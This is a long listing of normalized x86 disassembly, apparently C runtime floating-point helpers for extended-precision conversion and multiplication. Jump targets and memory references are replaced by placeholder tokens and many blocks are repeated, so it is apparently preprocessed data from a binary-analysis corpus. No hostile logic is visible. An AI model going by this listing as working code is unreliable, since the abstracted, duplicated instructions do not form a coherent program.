mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rwxdata ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rwxdata ]
add ebx [ rwxdata ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rwxdata ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_421beb
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rwxdata ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rwxdata ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rwxdata ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rwxdata ]
mov ecx eax
sub ecx [ rwxdata ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rwxdata ]
cmp ebx [ rwxdata ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rwxdata ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rwxdata ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rwxdata ]
add ebx [ rwxdata ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rwxdata ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_42213c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0xa ]
and [ ebp - 0x20 ] 0x0
mov eax edx
and eax 0x7fff
and edx 0x8000
push esi
mov esi [ ecx + 0x6 ]
mov [ ebp - 0x14 ] eax
mov eax edx
mov edx [ ecx + 0x2 ]
movzx ecx [ ecx ]
shl ecx 0x10
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x8 ] ecx
test ecx ecx
jns r-xdata
mov ecx 0x7fff
cmp [ ebp - 0x14 ] cx
jne r-xdata
test ecx 0x7fffffff
je r-xdata
or eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ax
mov eax [ ebp - 0x20 ]
mov [ edi ] edx
pop edi
xor ecx ebp
pop esi
call sub_40b946
leave
retn
mov [ ebp - 0x20 ] 0x1
lea ecx [ edx + 0x1 ]
xor esi esi
cmp ecx edx
jb r-xdata
xor esi esi
inc esi
cmp ecx 0x1
jae r-xdata
mov esi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
and [ ebp - 0x1c ] 0x0
lea ecx [ ebp + ecx * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
and [ ebp - 0x18 ] 0x0
mov [ ebp - 0xc ] ecx
mov ecx esi
mov [ ebp - 0x1c ] 0x1
cmp esi 0x1
jae r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
dec [ ebp - 0x18 ]
mov [ ecx ] esi
mov ecx [ ebp - 0x1c ]
jns r-xdata
inc [ ebp - 0x14 ]
mov esi 0x80000000
jmp r-xdata
mov edx [ ebp - 0xc ]
sub_422219
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi [ eax ]
mov ecx esi
add esi esi
push edi
mov edi [ eax + 0x4 ]
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
pop edi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
pop esi
pop ebp
retn
sub_42224c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
push esi
push edi
mov edi ecx
mov esi edx
shr ecx 0x1
shl esi 0x1f
or ecx esi
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
shl edi 0x1f
shr edx 0x1
shr ecx 0x1
or ecx edi
pop edi
mov [ eax + 0x8 ] edx
mov [ eax ] ecx
pop esi
pop ebp
retn
sub_42227e
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
mov ebx [ ebp + 0xc ]
movzx edx [ ebx + 0xa ]
push esi
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x20 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea esi [ edx + ecx ]
push edi
movzx esi si
mov edi 0x7fff
mov [ ebp - 0x30 ] esi
cmp cx di
jae r-xdata
xor edx edx
xor ecx ecx
cmp [ ebp - 0x20 ] cx
sete dl
dec edx
and edx 0x80000000
add edx 0x7fff8000
mov [ eax + 0x8 ] edx
cmp dx di
jae r-xdata
mov edi 0xbffd
cmp si di
ja r-xdata
mov edi 0x3fbf
cmp si di
ja r-xdata
mov edi 0x7fffffff
test cx cx
jne r-xdata
xor ecx ecx
xor ecx ecx
inc esi
mov [ ebp - 0x30 ] esi
test [ eax + 0x8 ] edi
jne r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ ebp - 0x1c ] ecx
lea edi [ ebp - 0xc ]
mov [ ebp - 0x18 ] 0x5
inc esi
mov [ ebp - 0x30 ] esi
test [ ebx + 0x8 ] edi
jne r-xdata
xor ecx ecx
cmp [ eax + 0x4 ] ecx
jne r-xdata
add edi 0x2
inc [ ebp - 0x1c ]
dec [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
add ebx 0x8
mov [ ebp - 0x24 ] ebx
lea ebx [ eax + ecx ]
cmp [ ebx + 0x4 ] ecx
jne r-xdata
cmp dx cx
jne r-xdata
cmp [ eax ] ecx
jne r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
add ecx ecx
mov [ ebp - 0x28 ] edx
test edx edx
jle r-xdata
add esi 0xc002
mov edi 0xffff
test si si
jle r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi ecx
jae r-xdata
cmp [ ebx ] ecx
je r-xdata
mov [ eax + 0xa ] cx
jmp r-xdata
add esi edi
test si si
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
sub [ ebp - 0x24 ] 0x2
add ebx 0x2
dec [ ebp - 0x28 ]
cmp [ ebp - 0x28 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x14 ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
mov ecx 0x8000
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov ecx esi
neg ecx
movzx ecx cx
mov [ ebp - 0x14 ] ecx
add esi ecx
test si si
jg r-xdata
mov ecx [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shl [ ebp - 0x10 ] 0x1
shr ecx 0x1f
add ebx ebx
or ebx ecx
mov ecx [ ebp - 0x8 ]
shr edx 0x1f
add ecx ecx
or ecx edx
add esi edi
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
test si si
jg r-xdata
mov edx [ ebp - 0x24 ]
movzx edx [ edx ]
movzx ecx [ ebx ]
and [ ebp - 0x14 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea esi [ edx + ecx ]
cmp esi edx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov esi [ ebp - 0x30 ]
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr ebx 0x1
or ebx ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec [ ebp - 0x14 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x2c ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov ecx 0x7fff
cmp si cx
jae r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov cx [ ebp - 0xe ]
or esi [ ebp - 0x20 ]
mov [ eax ] cx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x2 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x6 ] ecx
mov [ eax + 0xa ] si
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
cmp [ ebp - 0x6 ] di
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] cx
inc esi
jmp r-xdata
sub_4224f9
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx rwxdata
sub ecx 0x60
xor edx edx
mov [ ebp - 0x24 ] ecx
cmp [ ebp + 0xc ] edx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b946
leave
retn
jge r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
neg [ ebp + 0xc ]
mov ecx rwxdata
sub ecx 0x60
mov [ ebp - 0x24 ] ecx
cmp [ ebp + 0xc ] edx
je r-xdata
xor ecx ecx
mov [ eax ] cx
push ebx
push esi
push edi
xor edx edx
cmp [ ebp + 0xc ] edx
jne r-xdata
imul ecx ecx 0xc
add ecx [ ebp - 0x24 ]
mov ebx ecx
mov ecx 0x8000
cmp [ ebx ] cx
jb r-xdata
mov ecx [ ebp + 0xc ]
add [ ebp - 0x24 ] 0x54
sar [ ebp + 0xc ] 0x3
and ecx 0x7
cmp ecx edx
je r-xdata
pop edi
pop esi
pop ebx
movzx ecx [ eax + 0xa ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
movzx edx [ ebx + 0xa ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x30 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea edi [ edx + ecx ]
movzx edi di
mov [ ebp - 0x28 ] edi
cmp cx si
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x1a ]
lea ebx [ ebp - 0x1c ]
xor edx edx
xor ecx ecx
cmp [ ebp - 0x30 ] cx
sete dl
dec edx
and edx 0x80000000
add edx 0x7fff8000
mov [ eax + 0x8 ] edx
cmp dx si
jae r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
xor esi esi
cmp cx si
jne r-xdata
xor ecx ecx
mov [ eax + 0x8 ] ecx
jmp r-xdata
cmp dx si
jne r-xdata
inc edi
test [ eax + 0x8 ] 0x7fffffff
mov [ ebp - 0x28 ] edi
jne r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ ebp - 0x34 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x20 ] 0x5
inc edi
test [ ebx + 0x8 ] 0x7fffffff
mov [ ebp - 0x28 ] edi
jne r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
add esi 0x2
inc [ ebp - 0x34 ]
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x0
jg r-xdata
lea edx [ ebx + 0x8 ]
add ecx eax
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] ecx
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ eax ] esi
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x20 ]
add ecx ecx
mov [ ebp - 0x2c ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp edi ecx
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor ecx ecx
mov [ eax + 0xa ] cx
jmp r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x3c ] 0x2
